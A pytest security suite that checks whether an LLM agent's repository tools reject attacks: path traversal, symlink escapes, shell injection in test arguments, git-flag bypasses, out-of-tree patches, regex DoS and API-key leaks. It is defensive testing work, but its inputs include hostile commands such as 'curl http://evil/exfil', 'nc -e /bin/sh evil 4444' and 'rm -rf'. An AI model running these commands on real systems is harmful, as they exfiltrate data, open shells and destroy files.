"""Red-team suite for sage.tools.typed_repo — adversarial attack vectors.

Every test in this file represents an attack an LLM (or a malicious
prompt-injected response) could plausibly attempt. Each must be
rejected, or at worst fail safely (no secret leaked, no file outside
the sandbox touched, no shell metachar executed).

When a test fails here, the fix goes in the tool implementation or
in `_resolve_within_cwd` / `_validate_pytest_args` — NOT in the test.
A regression in this file is an actual security issue.

Organised by attack class:
  * A. Path-jail escape attempts
  * B. pytest argv injection
  * C. git_diff flag-allowlist bypass
  * D. apply_patch out-of-tree target
  * E. read_file special-device / binary
  * F. search_repo regex DoS
  * G. Env-scrub end-to-end confirmation
"""
from __future__ import annotations

import os
import sys
import time
from pathlib import Path

import pytest

from sage.tools._env_safe import safe_subprocess_env
from sage.tools.typed_repo import (
    PathJailError,
    _resolve_within_cwd,
    _validate_pytest_args,
    create_typed_repo_tools,
)


@pytest.fixture
def sandbox(monkeypatch, tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("x=1\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    yield tmp_path


@pytest.fixture
def tools_by_name(sandbox):
    return {t.spec.name: t for t in create_typed_repo_tools()}


# ==========================================================================
# A. Path-jail escape attempts
# ==========================================================================


@pytest.mark.parametrize("evil_path", [
    # Classic parent-directory escape
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    # Mixed separators (Windows / POSIX)
    "..\\..\\..\\etc\\passwd",
    "../\\../etc",
    # Null-byte truncation (old OS bug; Python's Path should handle it now)
    # Not actually accepted by Path but the rejection message should be
    # some variant of "invalid" / "path-jail", not a stack trace.
    "src/main.py\x00/etc/passwd",
    # Hidden traversal via deep relative path
    "src/../../../../../etc/passwd",
    "src/./../../etc/passwd",
])
def test_path_jail_rejects_parent_escapes(sandbox, evil_path):
    with pytest.raises((PathJailError, ValueError, OSError)):
        _resolve_within_cwd(evil_path)


def test_path_jail_rejects_absolute_posix(sandbox):
    with pytest.raises(PathJailError, match="absolute paths"):
        _resolve_within_cwd("/etc/passwd")


@pytest.mark.skipif(sys.platform != "win32", reason="Windows-only drive-letter path")
def test_path_jail_rejects_windows_drive_letter(sandbox):
    with pytest.raises(PathJailError):
        _resolve_within_cwd("C:/Windows/System32/config/SAM")


@pytest.mark.skipif(sys.platform == "win32", reason="UNC paths are a POSIX edge case too but format differs")
def test_path_jail_rejects_unc_path_as_absolute(sandbox):
    with pytest.raises(PathJailError):
        _resolve_within_cwd("//server/share/evil")


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="symlinks not supported on this OS")
def test_path_jail_rejects_symlink_escape(sandbox, tmp_path_factory):
    """Plant a symlink inside the sandbox pointing at a real file
    outside it, then try to read through the symlink. `_resolve_within_cwd`
    calls Path.resolve() which follows symlinks — the resolved target
    is outside the sandbox, so the relative_to() check rejects it."""
    outside = tmp_path_factory.mktemp("outside") / "secret.txt"
    outside.write_text("super-secret", encoding="utf-8")
    link = sandbox / "evil_link"
    try:
        os.symlink(outside, link)
    except (OSError, NotImplementedError):
        pytest.skip("cannot create symlinks on this environment (Windows without SeCreateSymbolicLinkPrivilege)")
    with pytest.raises(PathJailError):
        _resolve_within_cwd("evil_link")


@pytest.mark.asyncio
async def test_read_file_rejects_symlink_escape(tools_by_name, sandbox, tmp_path_factory):
    """End-to-end: the read_file tool (not the helper) must ALSO
    reject the symlink escape, since the LLM calls the tool, not
    the helper directly."""
    outside = tmp_path_factory.mktemp("outside_e2e") / "secret.txt"
    outside.write_text("super-secret", encoding="utf-8")
    link = sandbox / "evil_link"
    try:
        os.symlink(outside, link)
    except (OSError, NotImplementedError):
        pytest.skip("cannot create symlinks")
    result = await tools_by_name["read_file"].execute({"path": "evil_link"})
    assert "[ERROR]" in result.output
    assert "super-secret" not in result.output


# ==========================================================================
# B. pytest argv injection
# ==========================================================================


@pytest.mark.parametrize("evil_args", [
    # Positional test-node id with shell metachars
    ["tests/foo.py; rm -rf ."],
    ["tests/foo.py && curl http://evil/exfil"],
    ["tests/foo.py|nc -e /bin/sh evil 4444"],
    ["tests/foo.py`whoami`"],
    ["tests/foo.py$HOME"],
    ["tests/foo.py>/tmp/pwn"],
    ["tests/foo.py\nmalicious_second_line"],
    # Newlines in flag values (try to escape the allowlist's split)
    ["-k", "x\n--pdb"],
    # Flags that LOOK allowed but have a trailing payload
    ["-k=\"evil; rm\""],
])
def test_pytest_args_rejects_injection(evil_args):
    out, err = _validate_pytest_args(evil_args)
    assert out is None, f"Validator should have rejected {evil_args!r}"
    assert err, "Error message must explain the rejection"


@pytest.mark.parametrize("banned_flag", [
    # Known dangerous flags that must never be in the allowlist
    "--pdb",
    "-s",
    "--doctest-modules",
    "--collect-only",
    "--runxfail",
    "--capture=no",
    "--trace",
    "-p",          # plugin loader — arbitrary code execution
    "--plugin",
])
def test_pytest_args_rejects_known_dangerous_flag(banned_flag):
    out, err = _validate_pytest_args([banned_flag])
    assert out is None, f"{banned_flag} must not be allowed"
    assert "allowlist" in err


def test_pytest_args_rejects_unknown_flag_with_value():
    """A flag that looks like a valid pattern (`--foo=bar`) but
    isn't in the allowlist must still be rejected."""
    out, err = _validate_pytest_args(["--foo=bar"])
    assert out is None
    assert "allowlist" in err


# ==========================================================================
# C. git_diff flag-allowlist bypass
# ==========================================================================


@pytest.mark.asyncio
@pytest.mark.parametrize("evil_extra", [
    ["--exec=rm -rf /"],          # not in allowlist at all
    ["--ext-diff"],               # external diff hook
    ["--src-prefix=something"],    # also not allowlisted
    ["-U5; ls"],                  # shell metachar smuggled into value
    ["--stat; ls"],
    ["-U", "5", ";", "rm"],       # split across args — each token allowlist-checked
])
async def test_git_diff_rejects_bypass_attempts(tools_by_name, evil_extra):
    result = await tools_by_name["git_diff"].execute({"extra_args": evil_extra})
    assert "[ERROR]" in result.output, (
        f"git_diff should have rejected extra_args={evil_extra!r} but got "
        f"{result.output!r}"
    )


# ==========================================================================
# D. apply_patch out-of-tree target
# ==========================================================================


@pytest.mark.asyncio
async def test_apply_patch_rejects_dev_null_to_parent(tools_by_name):
    """Patch claims to CREATE a new file at `../../etc/evil`. Even
    though the `---` side is `/dev/null` (which we skip), the `+++`
    target is path-jailed and must abort."""
    evil = (
        "diff --git a/../../etc/evil b/../../etc/evil\n"
        "new file mode 100644\n"
        "--- /dev/null\n"
        "+++ b/../../etc/evil\n"
        "@@ -0,0 +1,1 @@\n"
        "+owned\n"
    )
    result = await tools_by_name["apply_patch"].execute({"diff": evil})
    assert "[ERROR] patch target path-jail violation" in result.output


@pytest.mark.asyncio
async def test_apply_patch_rejects_absolute_target(tools_by_name):
    evil = (
        "diff --git a//etc/passwd b//etc/passwd\n"
        "--- a//etc/passwd\n"
        "+++ b//etc/passwd\n"
        "@@ -1,1 +1,1 @@\n"
        "-old\n"
        "+new\n"
    )
    result = await tools_by_name["apply_patch"].execute({"diff": evil})
    # We look for either the path-jail rejection OR git-apply / patch
    # refusing the absolute path. Either is a safe outcome.
    assert "[ERROR]" in result.output or "INVALID" in result.output or "FAILED" in result.output


@pytest.mark.asyncio
async def test_apply_patch_rejects_multiple_targets_where_one_escapes(
    tools_by_name,
):
    """If a diff modifies two files and ONE of them escapes, the
    whole apply must abort (no partial application)."""
    evil = (
        "diff --git a/src/main.py b/src/main.py\n"
        "--- a/src/main.py\n"
        "+++ b/src/main.py\n"
        "@@ -1 +1 @@\n"
        "-x=1\n"
        "+x=2\n"
        "diff --git a/../../etc/evil b/../../etc/evil\n"
        "new file mode 100644\n"
        "--- /dev/null\n"
        "+++ b/../../etc/evil\n"
        "@@ -0,0 +1 @@\n"
        "+pwn\n"
    )
    result = await tools_by_name["apply_patch"].execute({"diff": evil})
    assert "[ERROR] patch target path-jail violation" in result.output
    # Verify src/main.py was NOT modified (content still "x=1\n")
    assert (Path.cwd() / "src" / "main.py").read_text(encoding="utf-8") == "x=1\n"


# ==========================================================================
# E. read_file special device / binary
# ==========================================================================


@pytest.mark.asyncio
async def test_read_file_rejects_directory(tools_by_name, sandbox):
    result = await tools_by_name["read_file"].execute({"path": "src"})
    assert "[ERROR]" in result.output
    assert "not a regular file" in result.output


@pytest.mark.asyncio
async def test_read_file_handles_empty_file(tools_by_name, sandbox):
    empty = sandbox / "empty.txt"
    empty.write_text("", encoding="utf-8")
    result = await tools_by_name["read_file"].execute({"path": "empty.txt"})
    assert not result.is_error
    # Empty file → empty string, no spurious error
    assert result.output == ""


@pytest.mark.asyncio
async def test_read_file_handles_negative_max_bytes(tools_by_name, sandbox):
    """Weird input values should not crash — they get clamped."""
    result = await tools_by_name["read_file"].execute(
        {"path": "src/main.py", "max_bytes": -1}
    )
    # max_bytes=-1 clamps to 0; result is an empty read (not an error).
    # Accept either "empty content" or a clean 0-byte result.
    assert result.output == "" or "[TRUNCATED" not in result.output


# ==========================================================================
# F. search_repo — regex DoS + pathological input
# ==========================================================================


@pytest.mark.asyncio
async def test_search_repo_bounded_on_pathological_regex(
    tools_by_name, sandbox, monkeypatch
):
    """A catastrophic-backtracking regex on a long string could hang
    the Python fallback. The tool's timeout (default 30s) should cap
    it; here we force the Python path via monkey-patching rg out and
    seed a single moderately-long file so completion is fast even
    without the regex bomb (we mostly verify no crash)."""
    import shutil

    real_which = shutil.which
    monkeypatch.setattr(
        "sage.tools.typed_repo.shutil.which",
        lambda name: None if name == "rg" else real_which(name),
    )
    # Seed a file with a line that could exhibit catastrophic
    # backtracking on a naive regex. Keep it short enough that the
    # 30 s timeout doesn't actually fire.
    bomb = sandbox / "bomb.txt"
    bomb.write_text("a" * 30 + "b", encoding="utf-8")
    t0 = time.perf_counter()
    result = await tools_by_name["search_repo"].execute(
        {"query": r"(a+)+b", "regex": True, "max_results": 1}
    )
    elapsed = time.perf_counter() - t0
    # Must complete (or timeout cleanly). Either way, no unhandled
    # crash, no unbounded hang.
    assert elapsed < 60, f"search took {elapsed:.1f}s — timeout guard failed"
    assert isinstance(result.output, str)


@pytest.mark.asyncio
async def test_search_repo_rejects_newline_query(tools_by_name):
    """A query with embedded newlines shouldn't smuggle a second
    ripgrep invocation via command injection — argv-list invocation
    means `rg query` treats the whole thing as one arg. We just
    verify the tool doesn't crash on the weird input."""
    result = await tools_by_name["search_repo"].execute(
        {"query": "foo\n--execute", "path": "."}
    )
    # Result may be "0 results" or an error string; must NOT be a
    # shell-interpreted second command.
    assert "execute" not in result.output or "[0 results]" in result.output or "[ERROR]" in result.output


# ==========================================================================
# G. Env-scrub end-to-end confirmation
# ==========================================================================


def test_env_scrub_blocks_every_common_secret_pattern(monkeypatch):
    """Set every common secret pattern and ensure none leak."""
    secrets = {
        "OPENAI_API_KEY": "sk-evil",
        "GOOGLE_API_KEY": "AIza-evil",
        "DEEPSEEK_API_KEY": "sk-deepseek-evil",
        "ANTHROPIC_API_KEY": "sk-ant-evil",
        "GROK_API_KEY": "grok-evil",
        "KIMI_API_KEY": "kimi-evil",
        "MINIMAX_API_KEY": "minimax-evil",
        "OPEN_ROUTER_API_KEY": "or-evil",
        "CONTEXT7": "ctx7sk-evil",
        "CONTEXT7_API_KEY": "ctx7sk-evil2",
        "SAGE_EXOCORTEX_STORE": "fileSearchStores/secret",
        "GITHUB_TOKEN": "ghp_evil",
        "AWS_ACCESS_KEY_ID": "AKIA-evil",
        "AWS_SECRET_ACCESS_KEY": "secret-evil",
        "DB_PASSWORD": "evil",
        "DATABASE_URL": "postgres://user:pass@host/db",
    }
    for key, val in secrets.items():
        monkeypatch.setenv(key, val)
    env = safe_subprocess_env()
    for key in secrets:
        assert key not in env, f"secret {key!r} leaked into safe subprocess env"


def test_env_scrub_no_empty_string_sneaks_through(monkeypatch):
    """Setting an env var to empty string shouldn't let it slip in — the
    allowlist is presence-based, not value-based. Belt-and-suspenders."""
    monkeypatch.setenv("API_KEY_EVIL", "")
    env = safe_subprocess_env()
    assert "API_KEY_EVIL" not in env
